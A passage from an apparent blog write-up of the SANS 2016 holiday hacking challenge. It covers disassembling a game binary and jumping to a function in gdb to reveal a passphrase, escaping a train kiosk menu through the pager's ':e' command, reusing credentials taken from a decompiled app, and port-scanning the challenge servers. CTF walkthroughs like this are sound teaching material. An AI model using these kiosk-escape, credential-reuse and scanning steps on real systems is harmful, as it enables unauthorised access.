&lt;span class="go"&gt;|           0x004026f3      488b45f8       mov rax, qword [rbp - local_8h]&lt;/span&gt;
&lt;span class="go"&gt;|           0x004026f7      488d5007       lea rdx, [rax + 7]          ; 0x7&lt;/span&gt;
&lt;span class="go"&gt;|           0x004026fb      488b05262a20.  mov rax, qword [obj.m1]     ; [0x605128:8]=0x4029bd str.Pattern_Recognition. LEA obj.m1 ; obj.m1&lt;/span&gt;
&lt;span class="go"&gt;|           0x00402702      0fb6400e       movzx eax, byte [rax + 0xe] ; [0xe:1]=0&lt;/span&gt;
&lt;span class="go"&gt;|           0x00402706      8802           mov byte [rdx], al&lt;/span&gt;
&lt;span class="go"&gt;|           0x00402708      488b45f8       mov rax, qword [rbp - local_8h]&lt;/span&gt;
&lt;span class="go"&gt;|           0x0040270c      488d5008       lea rdx, [rax + 8]          ; 0x8&lt;/span&gt;
&lt;span class="go"&gt;|           0x00402710      488b05212a20.  mov rax, qword [obj.m4]     ; [0x605138:8]=0x402a08 str.When_you_want_to_know_how_things_really_work__study_them_when_they_re_coming_apart LEA obj.m4 ; obj.m4&lt;/span&gt;
&lt;span class="go"&gt;|           0x00402717      0fb6402e       movzx eax, byte [rax + 0x2e] ; [0x2e:1]=0 ; &amp;#39;.&amp;#39;&lt;/span&gt;
&lt;span class="go"&gt;|           0x0040271b      8802           mov byte [rdx], al&lt;/span&gt;
&lt;span class="go"&gt;|           0x0040271d      488b45f8       mov rax, qword [rbp - local_8h]&lt;/span&gt;
&lt;span class="go"&gt;|           0x00402721      488d5009       lea rdx, [rax + 9]          ; 0x9&lt;/span&gt;
&lt;span class="go"&gt;|           0x00402725      488b05142a20.  mov rax, qword [obj.m5]     ; [0x605140:8]=0x402a60 str.We_have_no_future_because_our_present_is_too_volatile._We_have_only_risk_management. LEA obj.m5 ; &amp;quot;`*@&amp;quot; @ 0x605140&lt;/span&gt;
&lt;span class="go"&gt;|           0x0040272c      0fb64007       movzx eax, byte [rax + 7]   ; [0x7:1]=0&lt;/span&gt;
&lt;span class="go"&gt;|           0x00402730      8802           mov byte [rdx], al&lt;/span&gt;
&lt;span class="go"&gt;|           0x00402732      488b45f8       mov rax, qword [rbp - local_8h]&lt;/span&gt;
&lt;span class="go"&gt;|           0x00402736      488d500a       lea rdx, [rax + 0xa]        ; 0xa&lt;/span&gt;
&lt;span class="go"&gt;|           0x0040273a      488b05ff2920.  mov rax, qword [obj.m5]     ; [0x605140:8]=0x402a60 str.We_have_no_future_because_our_present_is_too_volatile._We_have_only_risk_management. LEA obj.m5 ; &amp;quot;`*@&amp;quot; @ 0x605140&lt;/span&gt;
&lt;span class="go"&gt;|           0x00402741      0fb64049       movzx eax, byte [rax + 0x49] ; [0x49:1]=0 ; &amp;#39;I&amp;#39;&lt;/span&gt;
&lt;span class="go"&gt;|           0x00402745      8802           mov byte [rdx], al&lt;/span&gt;
&lt;span class="go"&gt;|           0x00402747      488b45f8       mov rax, qword [rbp - local_8h]&lt;/span&gt;
&lt;span class="go"&gt;|           0x0040274b      488d500b       lea rdx, [rax + 0xb]        ; 0xb&lt;/span&gt;
&lt;span class="go"&gt;|           0x0040274f      488b05f22920.  mov rax, qword [obj.m6]     ; [0x605148:8]=0x402ab8 str.Stand_high_long_enough_and_your_lightning_will_come. LEA obj.m6 ; obj.m6&lt;/span&gt;
&lt;span class="go"&gt;|           0x00402756      0fb64007       movzx eax, byte [rax + 7]   ; [0x7:1]=0&lt;/span&gt;
&lt;span class="go"&gt;|           0x0040275a      8802           mov byte [rdx], al&lt;/span&gt;
&lt;span class="go"&gt;|           0x0040275c      488b45f8       mov rax, qword [rbp - local_8h]&lt;/span&gt;
&lt;span class="go"&gt;|           0x00402760      488d500c       lea rdx, [rax + 0xc]        ; 0xc&lt;/span&gt;
&lt;span class="go"&gt;|           0x00402764      488b05c52920.  mov rax, qword [obj.m2]     ; [0x605130:8]=0x4029d8 str.The_street_finds_its_own_uses_for_things. LEA obj.m2 ; obj.m2&lt;/span&gt;
&lt;span class="go"&gt;|           0x0040276b      0fb64004       movzx eax, byte [rax + 4]   ; [0x4:1]=2&lt;/span&gt;
&lt;span class="go"&gt;|           0x0040276f      8802           mov byte [rdx], al&lt;/span&gt;
&lt;span class="go"&gt;|           0x00402771      488b45f8       mov rax, qword [rbp - local_8h]&lt;/span&gt;
&lt;span class="go"&gt;|           0x00402775      488d500d       lea rdx, [rax + 0xd]        ; 0xd&lt;/span&gt;
&lt;span class="go"&gt;|           0x00402779      488b05b82920.  mov rax, qword [obj.m4]     ; [0x605138:8]=0x402a08 str.When_you_want_to_know_how_things_really_work__study_them_when_they_re_coming_apart LEA obj.m4 ; obj.m4&lt;/span&gt;
&lt;span class="go"&gt;|           0x00402780      0fb64007       movzx eax, byte [rax + 7]   ; [0x7:1]=0&lt;/span&gt;
&lt;span class="go"&gt;|           0x00402784      8802           mov byte [rdx], al&lt;/span&gt;
&lt;span class="go"&gt;|           0x00402786      488b45f8       mov rax, qword [rbp - local_8h]&lt;/span&gt;
&lt;span class="go"&gt;|           0x0040278a      488d500e       lea rdx, [rax + 0xe]        ; 0xe&lt;/span&gt;
&lt;span class="go"&gt;|           0x0040278e      488b05b32920.  mov rax, qword [obj.m6]     ; [0x605148:8]=0x402ab8 str.Stand_high_long_enough_and_your_lightning_will_come. LEA obj.m6 ; obj.m6&lt;/span&gt;
&lt;span class="go"&gt;|           0x00402795      0fb64003       movzx eax, byte [rax + 3]   ; [0x3:1]=70&lt;/span&gt;
&lt;span class="go"&gt;|           0x00402799      8802           mov byte [rdx], al&lt;/span&gt;
&lt;span class="go"&gt;|           0x0040279b      488b45f8       mov rax, qword [rbp - local_8h]&lt;/span&gt;
&lt;span class="go"&gt;|           0x0040279f      488d500f       lea rdx, [rax + 0xf]        ; 0xf&lt;/span&gt;
&lt;span class="go"&gt;|           0x004027a3      488b056e2920.  mov rax, qword [obj.m3]     ; [0x605118:8]=0x402958 str.0123456789abcdef LEA obj.m3 ; &amp;quot;X)@&amp;quot; @ 0x605118&lt;/span&gt;
&lt;span class="go"&gt;|           0x004027aa      0fb6400d       movzx eax, byte [rax + 0xd] ; [0xd:1]=0&lt;/span&gt;
&lt;span class="go"&gt;|           0x004027ae      8802           mov byte [rdx], al&lt;/span&gt;
&lt;span class="go"&gt;|           0x004027b0      488b45f8       mov rax, qword [rbp - local_8h]&lt;/span&gt;
&lt;span class="go"&gt;|           0x004027b4      488d5010       lea rdx, [rax + 0x10]       ; 0x10&lt;/span&gt;
&lt;span class="go"&gt;|           0x004027b8      488b05592920.  mov rax, qword [obj.m3]     ; [0x605118:8]=0x402958 str.0123456789abcdef LEA obj.m3 ; &amp;quot;X)@&amp;quot; @ 0x605118&lt;/span&gt;
&lt;span class="go"&gt;|           0x004027bf      0fb6400e       movzx eax, byte [rax + 0xe] ; [0xe:1]=0&lt;/span&gt;
&lt;span class="go"&gt;|           0x004027c3      8802           mov byte [rdx], al&lt;/span&gt;
&lt;span class="go"&gt;|           0x004027c5      488b45f8       mov rax, qword [rbp - local_8h]&lt;/span&gt;
&lt;span class="go"&gt;|           0x004027c9      488d5011       lea rdx, [rax + 0x11]       ; 0x11&lt;/span&gt;
&lt;span class="go"&gt;|           0x004027cd      488b055c2920.  mov rax, qword [obj.m2]     ; [0x605130:8]=0x4029d8 str.The_street_finds_its_own_uses_for_things. LEA obj.m2 ; obj.m2&lt;/span&gt;
&lt;span class="go"&gt;|           0x004027d4      0fb64006       movzx eax, byte [rax + 6]   ; [0x6:1]=1&lt;/span&gt;
&lt;span class="go"&gt;|           0x004027d8      8802           mov byte [rdx], al&lt;/span&gt;
&lt;span class="go"&gt;|           0x004027da      488b45f8       mov rax, qword [rbp - local_8h]&lt;/span&gt;
&lt;span class="go"&gt;|           0x004027de      488d5012       lea rdx, [rax + 0x12]       ; 0x12 ; &amp;quot;&amp;gt;&amp;quot;&lt;/span&gt;
&lt;span class="go"&gt;|           0x004027e2      488b055f2920.  mov rax, qword [obj.m6]     ; [0x605148:8]=0x402ab8 str.Stand_high_long_enough_and_your_lightning_will_come. LEA obj.m6 ; obj.m6&lt;/span&gt;
&lt;span class="go"&gt;|           0x004027e9      0fb600         movzx eax, byte [rax]&lt;/span&gt;
&lt;span class="go"&gt;|           0x004027ec      8802           mov byte [rdx], al&lt;/span&gt;
&lt;span class="go"&gt;|           0x004027ee      488b45f8       mov rax, qword [rbp - local_8h]&lt;/span&gt;
&lt;span class="go"&gt;|           0x004027f2      488d5013       lea rdx, [rax + 0x13]       ; 0x13&lt;/span&gt;
&lt;span class="go"&gt;|           0x004027f6      488b05232920.  mov rax, qword [obj.m0]     ; [0x605120:8]=0x402970 str.The_sky_above_the_port_was_the_color_of_television__tuned_to_a_dead_channel. LEA obj.m0 ; &amp;quot;p)@&amp;quot; @ 0x605120&lt;/span&gt;
&lt;span class="go"&gt;|           0x004027fd      0fb600         movzx eax, byte [rax]&lt;/span&gt;
&lt;span class="go"&gt;|           0x00402800      8802           mov byte [rdx], al&lt;/span&gt;
&lt;span class="go"&gt;|           0x00402802      488b45f8       mov rax, qword [rbp - local_8h]&lt;/span&gt;
&lt;span class="go"&gt;|           0x00402806      488d5014       lea rdx, [rax + 0x14]       ; 0x14&lt;/span&gt;
&lt;span class="go"&gt;|           0x0040280a      488b05272920.  mov rax, qword [obj.m4]     ; [0x605138:8]=0x402a08 str.When_you_want_to_know_how_things_really_work__study_them_when_they_re_coming_apart LEA obj.m4 ; obj.m4&lt;/span&gt;
&lt;span class="go"&gt;|           0x00402811      0fb64006       movzx eax, byte [rax + 6]   ; [0x6:1]=1&lt;/span&gt;
&lt;span class="go"&gt;|           0x00402815      8802           mov byte [rdx], al&lt;/span&gt;
&lt;span class="go"&gt;|           0x00402817      488b45f8       mov rax, qword [rbp - local_8h]&lt;/span&gt;
&lt;span class="go"&gt;|           0x0040281b      488d5015       lea rdx, [rax + 0x15]       ; 0x15&lt;/span&gt;
&lt;span class="go"&gt;|           0x0040281f      488b05fa2820.  mov rax, qword [obj.m0]     ; [0x605120:8]=0x402970 str.The_sky_above_the_port_was_the_color_of_television__tuned_to_a_dead_channel. LEA obj.m0 ; &amp;quot;p)@&amp;quot; @ 0x605120&lt;/span&gt;
&lt;span class="go"&gt;|           0x00402826      0fb6400a       movzx eax, byte [rax + 0xa] ; [0xa:1]=0&lt;/span&gt;
&lt;span class="go"&gt;|           0x0040282a      8802           mov byte [rdx], al&lt;/span&gt;
&lt;span class="go"&gt;|           0x0040282c      488b45f8       mov rax, qword [rbp - local_8h]&lt;/span&gt;
&lt;span class="go"&gt;|           0x00402830      488d5016       lea rdx, [rax + 0x16]       ; 0x16&lt;/span&gt;
&lt;span class="go"&gt;|           0x00402834      488b050d2920.  mov rax, qword [obj.m6]     ; [0x605148:8]=0x402ab8 str.Stand_high_long_enough_and_your_lightning_will_come. LEA obj.m6 ; obj.m6&lt;/span&gt;
&lt;span class="go"&gt;|           0x0040283b      0fb64004       movzx eax, byte [rax + 4]   ; [0x4:1]=2&lt;/span&gt;
&lt;span class="go"&gt;|           0x0040283f      8802           mov byte [rdx], al&lt;/span&gt;
&lt;span class="go"&gt;|           0x00402841      488b45f8       mov rax, qword [rbp - local_8h]&lt;/span&gt;
&lt;span class="go"&gt;|           0x00402845      4889c7         mov rdi, rax&lt;/span&gt;
&lt;span class="go"&gt;|           0x00402848      e861f6ffff     call sym.to_upper&lt;/span&gt;
&lt;span class="go"&gt;|           0x0040284d      bf9f364000     mov edi, str._nPassphrase:  ; str._nPassphrase:&lt;/span&gt;
&lt;span class="go"&gt;|           0x00402852      e859e2ffff     call sym.imp.puts          ; int puts(const char *s);&lt;/span&gt;
&lt;span class="go"&gt;|           0x00402857      488b45f8       mov rax, qword [rbp - local_8h]&lt;/span&gt;
&lt;span class="go"&gt;|           0x0040285b      4889c7         mov rdi, rax&lt;/span&gt;
&lt;span class="go"&gt;|           0x0040285e      e84de2ffff     call sym.imp.puts          ; int puts(const char *s);&lt;/span&gt;
&lt;span class="go"&gt;|           0x00402863      90             nop&lt;/span&gt;
&lt;span class="go"&gt;|           0x00402864      c9             leave&lt;/span&gt;
&lt;span class="go"&gt;\           0x00402865      c3             ret&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Instead of trying to statically analyze this function, we can use &lt;code&gt;gdb&lt;/code&gt;
to directly jump to it:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; gdb ./wumpus
&lt;span class="go"&gt;GNU gdb (Debian 7.7.1+dfsg-5) 7.7.1&lt;/span&gt;
&lt;span class="go"&gt;Copyright (C) 2014 Free Software Foundation, Inc.&lt;/span&gt;
&lt;span class="go"&gt;License GPLv3+: GNU GPL version 3 or later &amp;lt;http://gnu.org/licenses/gpl.html&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;This is free software: you are free to change and redistribute it.&lt;/span&gt;
&lt;span class="go"&gt;There is NO WARRANTY, to the extent permitted by law.  Type &amp;quot;show copying&amp;quot;&lt;/span&gt;
&lt;span class="go"&gt;and &amp;quot;show warranty&amp;quot; for details.&lt;/span&gt;
&lt;span class="go"&gt;This GDB was configured as &amp;quot;x86_64-linux-gnu&amp;quot;.&lt;/span&gt;
&lt;span class="go"&gt;Type &amp;quot;show configuration&amp;quot; for configuration details.&lt;/span&gt;
&lt;span class="go"&gt;For bug reporting instructions, please see:&lt;/span&gt;
&lt;span class="go"&gt;&amp;lt;http://www.gnu.org/software/gdb/bugs/&amp;gt;.&lt;/span&gt;
&lt;span class="go"&gt;Find the GDB manual and other documentation resources online at:&lt;/span&gt;
&lt;span class="go"&gt;&amp;lt;http://www.gnu.org/software/gdb/documentation/&amp;gt;.&lt;/span&gt;
&lt;span class="go"&gt;For help, type &amp;quot;help&amp;quot;.&lt;/span&gt;
&lt;span class="go"&gt;Type &amp;quot;apropos word&amp;quot; to search for commands related to &amp;quot;word&amp;quot;...&lt;/span&gt;
&lt;span class="go"&gt;Reading symbols from ./wumpus...(no debugging symbols found)...done.&lt;/span&gt;
&lt;span class="go"&gt;(gdb) r&lt;/span&gt;
&lt;span class="go"&gt;Starting program: ./wumpus&lt;/span&gt;
&lt;span class="go"&gt;Instructions? (y-n) ^Z&lt;/span&gt;
&lt;span class="go"&gt;Program received signal SIGTSTP, Stopped (user).&lt;/span&gt;
&lt;span class="go"&gt;0x00007ffff7b0cba0 in __read_nocancel () at ../sysdeps/unix/syscall-template.S:81&lt;/span&gt;
&lt;span class="go"&gt;81  ../sysdeps/unix/syscall-template.S: Aucun fichier ou dossier de ce type.&lt;/span&gt;
&lt;span class="hll"&gt;&lt;span class="go"&gt;(gdb) j kill_wump&lt;/span&gt;
&lt;/span&gt;&lt;span class="go"&gt;Continuing at 0x402648.&lt;/span&gt;
&lt;span class="go"&gt;*thwock!* *groan* *crash*&lt;/span&gt;

&lt;span class="go"&gt;A horrible roar fills the cave, and you realize, with a smile, that you&lt;/span&gt;
&lt;span class="go"&gt;have slain the evil Wumpus and won the game!  You don&amp;#39;t want to tarry for&lt;/span&gt;
&lt;span class="go"&gt;long, however, because not only is the Wumpus famous, but the stench of&lt;/span&gt;
&lt;span class="go"&gt;dead Wumpus is also quite well known, a stench plenty enough to slay the&lt;/span&gt;
&lt;span class="go"&gt;mightiest adventurer at a single whiff!!&lt;/span&gt;

&lt;span class="go"&gt;Passphrase:&lt;/span&gt;
&lt;span class="hll"&gt;&lt;span class="go"&gt;WUMPUS IS MISUNDERSTOOD&lt;/span&gt;
&lt;/span&gt;
&lt;span class="go"&gt;Program received signal SIGSEGV, Segmentation fault.&lt;/span&gt;
&lt;span class="go"&gt;0x00007ffff7ff5000 in ?? ()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;If you &lt;cite&gt;reaaaaally&lt;/cite&gt; want to do it by hand, here's a short explanation (statical
analysis and disassembly are not my strong suits):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="go"&gt;[...]&lt;/span&gt;
&lt;span class="go"&gt;|           0x00402656      bf18000000     mov edi, 0x18               ; &amp;quot;0.@&amp;quot;&lt;/span&gt;
&lt;span class="go"&gt;|           0x0040265b      e8f0e4ffff     call sym.imp.malloc        ;  void *malloc(size_t size);&lt;/span&gt;
&lt;span class="go"&gt;|           0x00402660      488945f8       mov qword [rbp - local_8h], rax&lt;/span&gt;
&lt;span class="go"&gt;|           0x00402664      488b05cd2a20.  mov rax, qword [obj.m4]     ; [0x605138:8]=0x402a08 str.When_you_want_to_know_how_things_really_work__study_them_when_they_re_coming_apart LEA obj.m4 ; obj.m4&lt;/span&gt;
&lt;span class="go"&gt;|           0x0040266b      0fb65009       movzx edx, byte [rax + 9]   ; [0x9:1]=0&lt;/span&gt;
&lt;span class="go"&gt;|           0x0040266f      488b45f8       mov rax, qword [rbp - local_8h]&lt;/span&gt;
&lt;span class="go"&gt;|           0x00402673      8810           mov byte [rax], dl&lt;/span&gt;
&lt;span class="go"&gt;|           0x00402675      488b45f8       mov rax, qword [rbp - local_8h]&lt;/span&gt;
&lt;span class="go"&gt;[...]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Before the passphrase is printed, we can see that the program allocates memory
for a buffer, with a call so &lt;code&gt;sym.imp.malloc&lt;/code&gt;. The size of the buffer is
&lt;code&gt;0x18&lt;/code&gt; bytes, which is exactly the size of our final passphrase, plus
one, for the NULL byte (&lt;strong&gt;wink, wink&lt;/strong&gt;). So, our final passphrase will be
constructed and put into a final buffer.&lt;/p&gt;
&lt;p&gt;Then, we can see that several strings are used to compute our final passphrase.
The first one is:&lt;/p&gt;
&lt;blockquote&gt;
When you &lt;strong&gt;w&lt;/strong&gt;ant to know how things really work, study them when
they're coming apart&lt;/blockquote&gt;
&lt;p&gt;The pointer to this string is put into the &lt;code&gt;rax&lt;/code&gt; register. The byte
situated at &lt;code&gt;rax + 9&lt;/code&gt; is then put into the &lt;code&gt;edx&lt;/code&gt; register. If we
take our string, and get the 9th character (starting counting from 0), we get
the &lt;code&gt;w&lt;/code&gt; from &lt;code&gt;want&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;This character is then moved to the &lt;code&gt;local_8h&lt;/code&gt; variable. We now have a
&lt;code&gt;local_8h&lt;/code&gt; variable, starting with &lt;code&gt;w&lt;/code&gt;. Incidently, it's the first
character of our final passphrase (see where this is going?).&lt;/p&gt;
&lt;p&gt;We then move on to the second character, using the following string:&lt;/p&gt;
&lt;blockquote&gt;
We have no fut&lt;strong&gt;u&lt;/strong&gt;re because our present is too volatile. We have
only risk management.&lt;/blockquote&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="go"&gt;[...]&lt;/span&gt;
&lt;span class="go"&gt;|           0x00402679      488d5001       lea rdx, [rax + 1]          ; 0x1&lt;/span&gt;
&lt;span class="go"&gt;|           0x0040267d      488b05bc2a20.  mov rax, qword [obj.m5]     ; [0x605140:8]=0x402a60 str.We_have_no_future_because_our_present_is_too_volatile._We_have_only_risk_management. LEA obj.m5 ; &amp;quot;`*@&amp;quot; @ 0x605140&lt;/span&gt;
&lt;span class="go"&gt;|           0x00402684      0fb6400e       movzx eax, byte [rax + 0xe] ; [0xe:1]=0&lt;/span&gt;
&lt;span class="go"&gt;|           0x00402688      8802           mov byte [rdx], al&lt;/span&gt;
&lt;span class="go"&gt;|           0x0040268a      488b45f8       mov rax, qword [rbp - local_8h]&lt;/span&gt;
&lt;span class="go"&gt;[...]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;We see that the byte situated at &lt;code&gt;rax + 0xe&lt;/code&gt;, which is the second
&lt;code&gt;u&lt;/code&gt; in &lt;code&gt;future&lt;/code&gt;, is stored in &lt;code&gt;edx&lt;/code&gt;. This character is then
moved to &lt;code&gt;local_8h + 1&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Our &lt;code&gt;local_8h&lt;/code&gt; now begins with &lt;code&gt;wu&lt;/code&gt;. We do this for the rest of the
strings, and we finally get &lt;code&gt;wumpus is misunderstood&lt;/code&gt;, before the call to
the &lt;code&gt;sym.to_upper&lt;/code&gt; function, giving us the final passphrase.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="go"&gt;[...]&lt;/span&gt;
&lt;span class="go"&gt;|           0x0040283b      0fb64004       movzx eax, byte [rax + 4]   ; [0x4:1]=2&lt;/span&gt;
&lt;span class="go"&gt;|           0x0040283f      8802           mov byte [rdx], al&lt;/span&gt;
&lt;span class="go"&gt;|           0x00402841      488b45f8       mov rax, qword [rbp - local_8h]&lt;/span&gt;
&lt;span class="go"&gt;|           0x00402845      4889c7         mov rdi, rax&lt;/span&gt;
&lt;span class="hll"&gt;&lt;span class="go"&gt;|           0x00402848      e861f6ffff     call sym.to_upper&lt;/span&gt;
&lt;/span&gt;&lt;span class="go"&gt;|           0x0040284d      bf9f364000     mov edi, str._nPassphrase:  ; str._nPassphrase:&lt;/span&gt;
&lt;span class="go"&gt;|           0x00402852      e859e2ffff     call sym.imp.puts          ; int puts(const char *s);&lt;/span&gt;
&lt;span class="hll"&gt;&lt;span class="go"&gt;|           0x00402857      488b45f8       mov rax, qword [rbp - local_8h]&lt;/span&gt;
&lt;/span&gt;&lt;span class="hll"&gt;&lt;span class="go"&gt;|           0x0040285b      4889c7         mov rdi, rax&lt;/span&gt;
&lt;/span&gt;&lt;span class="hll"&gt;&lt;span class="go"&gt;|           0x0040285e      e84de2ffff     call sym.imp.puts          ; int puts(const char *s);&lt;/span&gt;
&lt;/span&gt;&lt;span class="go"&gt;[...]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Passphrase: &lt;code&gt;WUMPUS IS MISUNDERSTOOD&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;This passphrase gives you an access to a room called DFER, where there's no
terminal.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="train-station"&gt;
&lt;h3&gt;&lt;a class="toc-backref" href="#id9"&gt;Train station&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;You're given access to a kiosk menu to control the train:&lt;/p&gt;
&lt;pre class="literal-block"&gt;
Train Management Console: AUTHORIZED USERS ONLY
                ==== MAIN MENU ====
STATUS:                         Train Status
BRAKEON:                        Set Brakes
BRAKEOFF:                       Release Brakes
START:                          Start Train
HELP:                           Open the help document
QUIT:                           Exit console
menu:main&amp;gt;
&lt;/pre&gt;
&lt;p&gt;If you want to start the train, you must release the brakes, and know the
correct passphrase:&lt;/p&gt;
&lt;pre class="literal-block"&gt;
                ==== MAIN MENU ====
STATUS:                         Train Status
BRAKEON:                        Set Brakes
BRAKEOFF:                       Release Brakes
START:                          Start Train
HELP:                           Open the help document
QUIT:                           Exit console
menu:main&amp;gt; BRAKEOFF
*******CAUTION*******
The brake has been released!
*******CAUTION*******
off
                ==== MAIN MENU ====
STATUS:                         Train Status
BRAKEON:                        Set Brakes
BRAKEOFF:                       Release Brakes
START:                          Start Train
HELP:                           Open the help document
QUIT:                           Exit console
menu:main&amp;gt; START
Checking brakes....
Enter Password:
&lt;/pre&gt;
&lt;p&gt;Let's see how we can find this password.&lt;/p&gt;
&lt;p&gt;If you take a look at the &lt;code&gt;HELP&lt;/code&gt; function, you can see that it's opening
a help file. The clue in the description of the &lt;code&gt;HELP&lt;/code&gt; function
(&amp;quot;un&lt;strong&gt;LESS&lt;/strong&gt; you know something I don't&amp;quot;), plus the name of the file at the
bottom of the screen, is a strong indicator that the menu is using the
&lt;code&gt;less&lt;/code&gt; command to open the help file:&lt;/p&gt;
&lt;img alt="help_command.png" class="align-center" src="/images/sans-christmas-challenge-2016/help_command.png" /&gt;
&lt;p&gt;By using the &lt;code&gt;:e&lt;/code&gt; command, we can examine another file than the one open.
By using tabulation auto-complete, we can see the name of the script used to
display the kiosk menu, &lt;code&gt;Train_Console&lt;/code&gt;:&lt;/p&gt;
&lt;img alt="help_command_exploit.png" class="align-center" src="/images/sans-christmas-challenge-2016/help_command_exploit.png" /&gt;
&lt;img alt="help_command_exploit_train_console_script.png" class="align-center" src="/images/sans-christmas-challenge-2016/help_command_train_console_script.png" /&gt;
&lt;p&gt;Passphrase: &lt;code&gt;24fb3e89ce2aa0ea422c3d511d40dd84&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;By starting the train, we can see that we can travel to the past, in 1978!&lt;/p&gt;
&lt;img alt="train_back_to_the_future.png" class="align-center" src="/images/sans-christmas-challenge-2016/train_back_to_the_future.png" /&gt;
&lt;p&gt;We then arrive in the North Pole, but in 1978:&lt;/p&gt;
&lt;img alt="north_pole_1978.png" class="align-center" src="/images/sans-christmas-challenge-2016/north_pole_1978.png" /&gt;
&lt;p&gt;We can go, in 1978, into every room that we unlocked in 2016. By doing so, we
find Santa in the DFER (&amp;quot;Dungeon For Errant Reindeer&amp;quot;) room:&lt;/p&gt;
&lt;img alt="found_santa.png" class="align-center" src="/images/sans-christmas-challenge-2016/found_santa.png" /&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="part-4-my-gosh-it-s-full-of-holes"&gt;
&lt;h2&gt;&lt;a class="toc-backref" href="#id10"&gt;Part 4: My Gosh... It's Full of Holes&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;Well, we've found Santa, Christmas is saved, hurray! But the abductor is still
roaming free. And since Santa is suffering from short-term memory loss because
of the fight, he doesn't remember who attacked him. So, who is behind Santa's
attack, and where can we find them? By taking a look at the SantaGram
application, we may find some interesting informations.&lt;/p&gt;
&lt;p&gt;We're looking for servers the SantaGram application interacts with. By looking
at the resource file in the decompiled APK, we can find several URLs:&lt;/p&gt;
&lt;pre class="literal-block"&gt;
0x7f070015 (2131165205) = string.analytics_launch_url: https://analytics.northpolewonderland.com/report.php?type=launch
0x7f070016 (2131165206) = string.analytics_usage_url: https://analytics.northpolewonderland.com/report.php?type=usage
[...]
0x7f07001a (2131165210) = string.banner_ad_url: http://ads.northpolewonderland.com/affiliate/C9E380C8-2244-41E3-93A3-D6C6700156A5
[...]
0x7f07001d (2131165213) = string.debug_data_collection_url: http://dev.northpolewonderland.com/index.php
[...]
0x7f07001f (2131165215) = string.dungeon_url: http://dungeon.northpolewonderland.com/
0x7f070020 (2131165216) = string.exhandler_url: http://ex.northpolewonderland.com/exception.php
&lt;/pre&gt;
&lt;p&gt;This gives us a total of five servers to target:&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;analytics.northpolewonderland.com&lt;/li&gt;
&lt;li&gt;ads.northpolewonderland.com&lt;/li&gt;
&lt;li&gt;dev.northpolewonderland.com&lt;/li&gt;
&lt;li&gt;dungeon.northpolewonderland.com&lt;/li&gt;
&lt;li&gt;ex.northpolewonderland.com&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;We can confirm with the Great and Powerful Oracle, Tom Hessman, that these are
indeed, the servers to target:&lt;/p&gt;
&lt;img alt="tom_hessman.png" class="align-center" src="/images/sans-christmas-challenge-2016/tom_hessman.png" /&gt;
&lt;p&gt;Alright, let the hacking begin!&lt;/p&gt;
&lt;div class="section" id="the-mobile-analytics-server-via-credentialed-login-access"&gt;
&lt;h3&gt;&lt;a class="reference external" href="https://analytics.northpolewonderland.com/"&gt;The Mobile Analytics Server (via credentialed login access)&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;For the first part of this server, you only need to log in with the credentials
found in the decompiled APK, &lt;code&gt;guess/busyreindeer78&lt;/code&gt;. Once you're
connected, you can download the wanted audio file:&lt;/p&gt;
&lt;img alt="first_audio_file.png" class="align-center" src="/images/sans-christmas-challenge-2016/first_audio_file.png" /&gt;
&lt;/div&gt;
&lt;div class="section" id="the-dungeon-game"&gt;
&lt;h3&gt;&lt;a class="reference external" href="http://dungeon.northpolewonderland.com/"&gt;The Dungeon Game&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;The web server of the Dungeon game gives us instructions on how to play. A
mischievous Elf is said to trade secrets for gifts. If we give him a gift, he
may help us find the villain!&lt;/p&gt;
&lt;p&gt;However, we can't seem to start a party on the web page. Similarly as last
year, and since an elf in the North Pole hints to do so, I suspected there was
another open port, on which we could connect to play the Dungeon game:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; nmap dungeon.northpolewonderland.com

&lt;span class="go"&gt;Starting Nmap 6.47 ( http://nmap.org ) at 2016-12-29 21:58 CET&lt;/span&gt;
&lt;span class="go"&gt;Nmap scan report for dungeon.northpolewonderland.com (35.184.47.139)&lt;/span&gt;
&lt;span class="go"&gt;Host is up (0.12s latency).&lt;/span&gt;
&lt;span class="go"&gt;rDNS record for 35.184.47.139: 139.47.184.35.bc.googleusercontent.com&lt;/span&gt;
&lt;span class="go"&gt;Not shown: 994 closed ports&lt;/span&gt;
&lt;span class="go"&gt;PORT      STATE    SERVICE&lt;/span&gt;
&lt;span class="go"&gt;22/tcp    open     ssh&lt;/span&gt;
&lt;span class="go"&gt;80/tcp    open     http&lt;/span&gt;
&lt;span class="go"&gt;135/tcp   filtered msrpc&lt;/span&gt;
&lt;span class="go"&gt;139/tcp   filtered netbios-ssn&lt;/span&gt;
&lt;span class="go"&gt;445/tcp   filtered microsoft-ds&lt;/span&gt;
&lt;span class="hll"&gt;&lt;span class="go"&gt;11111/tcp open     vce&lt;/span&gt;
&lt;/span&gt;
